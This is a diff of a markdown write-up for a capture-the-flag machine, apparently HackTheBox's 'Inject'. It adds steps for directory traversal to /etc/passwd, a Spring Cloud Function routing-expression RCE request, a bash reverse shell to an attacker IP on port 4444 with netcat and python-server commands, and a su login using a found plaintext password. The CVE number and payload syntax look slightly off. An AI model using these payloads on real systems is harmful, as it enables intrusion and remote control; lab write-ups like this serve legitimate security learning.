@@ -48,22 +48,22 @@ Detailed information are shown below:
 ## BurpSuite
 
 Performing web app enumeration using BurpSuite, following request was intercepted.
-<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/4c7eabac-0ac5-4277-a6fc-1dc42846c075" />
+<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/4c7eabac-0ac5-4277-a6fc-1dc42846c075" />
 
 <br>
 
 Forwarding the following request, following GET request was received.
-<img width="600" height="500" alt="image" src="https://github.com/user-attachments/assets/ef052178-8268-438a-9b39-9960510279c2" />
+<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/ef052178-8268-438a-9b39-9960510279c2" />
 
 ---
 
 # 3. Exploitation
 
-## Directory Traversal
+## 1. Directory Traversal
 
 Sending the `GET request` to repeater, parameter named `img` was revealed directly, which could cause `directory traversal attack` in the victim's viewpoint. With the knowledge, attack was performed by putting `../../../../../../etc/passwd` to read `/etc/passwd` file in the internal server to revealed parameter, which caused following result shown in `response` section.
 
-<img width="600" height="500" alt="image" src="https://github.com/user-attachments/assets/0b1173f3-4d7c-436b-ba82-8c382f141474" />
+<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/0b1173f3-4d7c-436b-ba82-8c382f141474" />
 
 <br>
 
@@ -73,11 +73,92 @@ Based on the shown result above, attack was successful. With the information att
 
 Checking `/var/www` directory, which usually contains the configuration information about web application, directory named `WebApp` was discovered. Looking into the direcotry, file name `pom.xml` was fonud. Gathering information about `.xml` extension, it is discovered that it usually contains detailed web application information, including version and running service for maintenance. Following information was discovered.
 
-<img width="600" height="500" alt="image" src="https://github.com/user-attachments/assets/38b8f3df-2fda-4c07-9a33-03f7f7c613db" />
+<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/38b8f3df-2fda-4c07-9a33-03f7f7c613db" />
+
+<br>
+
+## 2. CVE-2022-22693
+Researching for the vulnerable service among revealed information, Springboot framework version 3.2.2 was vulnerable for RCE. Using the contained function named `functionRouter` under the framework, following is the crafted payload.
+```bash
+POST /functionRouter HTTP/1.1
+Host: 10.129.228.213:8080
+.
+.
+.
+Content-Length: 11
+spring.cloud.function.routing-expression:
+T(java.lang.Runtime).getRuntime().exe("<cmd>")
+
+img=rev.png
+```
+<br>
+
+Sending random file to the target system via `curl` was successful.
+<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/7df4b68d-601d-42c2-a8f7-c939ca2e78a4" />
+
+<br>
+
+## 3. Reverse Shell
+Confirming the GET request from the target system, crafting reverse shell executable and trigger from target machine for gaining initial access was possible. Here are the processes of gaining initial access.
+
+* **1. Crafting Bash Shell Script**
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.16.155/4444 0>&1
+```
+
+* **2. Send Crafted Script to the Target Internal Server**
+
+For sending the crafted script, initiating python server listener on the attacker's machine was performed. 
+```bash
+python3 -m http.server
+```
+
+<br>
+
+Confirming the port 8000 was opened for sending file to victim's internal server, the malicious script was sent to the victim's `/tmp` directory.
+<img width="500" height="550" alt="image" src="https://github.com/user-attachments/assets/37639adf-77fa-49a9-a12b-d2b7960ec307" />
+
+<br>
+
+Sending the above request via `repeater`, it was confirmed the payload was saved under `/tmp/rev.sh`. 
+<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/cd69cc6b-0593-4123-a22b-c6fe63ab691d" />
+
+
+* **3. Trigger the Payload to Initiate Remote Access to Target System**
+Starting `netcat listner` for receiving reverse shell connection on port 4444 based on crafted script.
+```bash
+nc -lvnp 4444
+```
+
+<br>
+
+The script was triggered via sending following request to the victim's system.
+<img width="550" height="500" alt="image" src="https://github.com/user-attachments/assets/258e66d0-37bb-44b3-a194-12d3784c2e5a" />
+
+Finally, shell was triggered and sent to attacker's listening port, access as user `frank`'s privilege was successful.
+<img width="550" height="125" alt="image" src="https://github.com/user-attachments/assets/2da97dd8-9813-4e83-afac-e82e7f01704e" />
 
 ---
 
-## CVE-2022-22693
+# 4. Privilege Escalation
+
+## 1. Shell as Phil
+Checking the home directory of user `frank`, directory name `.m2` was found. Enumerating the contents of directory, another .xml file was found, which was containing the password of username `phil`.
+<img width="600" height="500" alt="image" src="https://github.com/user-attachments/assets/32fcf4e2-c8a5-4df8-86f0-10ff1b772b70" />
+
+<br> 
+
+Gaining access as username `phil` was successful using the found credential.
+```bash
+su phil
+Password: DocPhillovestoInject123
+phil@inject:~$ 
+```
+
+## 2. Shell as Root
+
+
 
 
 
